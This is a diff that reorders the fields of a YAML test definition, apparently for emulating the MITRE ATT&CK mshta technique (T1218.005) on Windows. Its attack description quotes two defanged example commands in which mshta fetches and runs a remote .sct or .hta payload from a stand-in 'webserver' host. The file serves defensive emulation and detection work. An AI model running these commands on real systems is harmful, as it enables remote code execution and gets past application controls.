@@ -1,14 +1,3 @@
-guid: e7e3a525-7612-4d68-a5d3-c4649181b8af
-name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler
-tactic:
-  - defense-evasion
-technique:
-  - T1218.005
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.
 Attack_name: Mshta
 Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types\
   \ of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA)\
@@ -17,3 +6,14 @@ Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malic
   \ mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta\
   \ http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's\
   \ security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
+guid: e7e3a525-7612-4d68-a5d3-c4649181b8af
+name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler
+tactic:
+  - defense-evasion
+technique:
+  - T1218.005
+os:
+  - windows
+description: Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.
+sigma: false
+sigma_rule: []
